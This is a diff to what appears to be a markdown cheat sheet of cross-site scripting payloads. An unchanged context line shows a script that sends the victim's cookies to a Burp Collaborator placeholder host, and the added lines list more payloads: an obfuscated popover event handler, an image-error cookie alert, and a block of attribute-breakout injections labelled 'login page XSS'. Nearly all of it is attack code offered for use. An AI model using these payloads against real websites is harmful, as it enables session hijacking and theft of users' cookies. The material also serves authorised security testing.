@@ -69,6 +69,24 @@ SVG
 
 `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`   To Steal Cookies, cookies will be send to us.
 
+`javascript​:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle​="+a+b+c+" popover id=x>Hvita</hvita>")` 
+
+`</div><img src="x" onerror​="alert(document.cookie)"/><div><p>`
+
+login page XSS
+
+```
+"><​script>alert(1)<​/script>
+"><img src=x onerror​=alert(1)>
+"><video src onerror​=alert(1)>
+"><audio src onerror​=alert(1)>
+"><svg/onload​=alert(1)>
+"><body/onload​=alert(1)>
+"><input/onfocus​=alert(1)>
+"><div onpointerover​=alert(1)>
+"><b onmouseover​=alert(1)>hover
+```
+
 XSS to CSRF:
 
 ```
